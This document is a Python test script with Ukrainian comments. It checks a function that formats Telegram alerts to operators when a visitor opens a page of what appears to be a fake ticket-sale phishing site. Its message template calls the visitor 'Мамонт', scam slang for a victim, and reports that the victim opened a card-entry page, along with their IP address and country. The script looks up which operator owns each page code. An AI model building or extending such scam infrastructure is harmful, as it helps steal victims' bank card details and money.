#!/usr/bin/env python3
"""
Тест функції send_activity_notification_to_admin без залежності від bot
"""

import sqlite3
import sys
import os

# Додаємо поточну директорію до шляху для імпорту
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

def test_send_notification_logic():
    """Тестує логіку send_activity_notification_to_admin без bot"""
    
    print("🧪 Тестування логіки send_activity_notification_to_admin...")
    
    # Підключаємося до бази даних
    try:
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        print("✅ Підключення до бази даних успішне")
    except Exception as e:
        print(f"❌ Помилка підключення до бази даних: {e}")
        return
    
    # Тестові дані
    test_cases = [
        {
            "page_code": "1-4",
            "user_ip": "37.52.215.105",
            "user_country": "UA",
            "page_name": "Ввод карты",
            "page_url": "/buy-tickets/loading/",
            "action_type": "page_view"
        }
    ]
    
    for i, test_case in enumerate(test_cases, 1):
        print(f"\n📋 Тест {i}: {test_case['page_code']}")
        
        try:
            # Імітуємо логіку send_activity_notification_to_admin
            page_code = test_case['page_code']
            user_ip = test_case['user_ip']
            user_country = test_case['user_country']
            page_name = test_case['page_name']
            page_url = test_case['page_url']
            action_type = test_case['action_type']
            
            print(f"   🔍 Шукаю admin_id для page_code: {page_code}")
            
            # Отримуємо admin_id за page_code
            c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
            row = c.fetchone()
            
            if not row:
                print(f"   ❌ Не знайдено в event_links")
                # Якщо не знайдено в event_links, шукаємо в site_users
                c.execute('SELECT tg_id FROM site_users WHERE page_code=?', (page_code,))
                row = c.fetchone()
                if row:
                    print(f"   ✅ Знайдено в site_users: tg_id = {row[0]}")
                else:
                    print(f"   ❌ Не знайдено в site_users")
                    continue
            else:
                print(f"   ✅ Знайдено в event_links: user_id = {row[0]}")
            
            if row:
                admin_id = row[0]
                print(f"   👤 admin_id: {admin_id}")
                
                # Перевіряємо, чи існує користувач
                c.execute('SELECT user_id, username FROM users WHERE user_id=?', (admin_id,))
                user_row = c.fetchone()
                if user_row:
                    print(f"   ✅ Користувач знайдений: ID={user_row[0]}, username={user_row[1]}")
                else:
                    print(f"   ⚠️ Користувач не знайдений в таблиці users")
                
                # Формуємо повідомлення
                message = f"""🔔Мамонт открыл страницу ({page_name})

📎Страница: {page_name}
#️⃣Ссылка: ?page={page_code}
📶IP: {user_ip}
🌎Страна: {user_country}"""
                
                print(f"   📝 Сформоване повідомлення:")
                print(f"   {message}")
                
                print(f"   📤 Готово до відправки адміну {admin_id}")
                
            else:
                print(f"   ❌ admin_id не знайдено для page_code: {page_code}")
                
        except Exception as e:
            print(f"   ❌ Помилка: {e}")
            import traceback
            traceback.print_exc()
    
    conn.close()
    print(f"\n✅ Тест завершено")

if __name__ == "__main__":
    test_send_notification_logic()
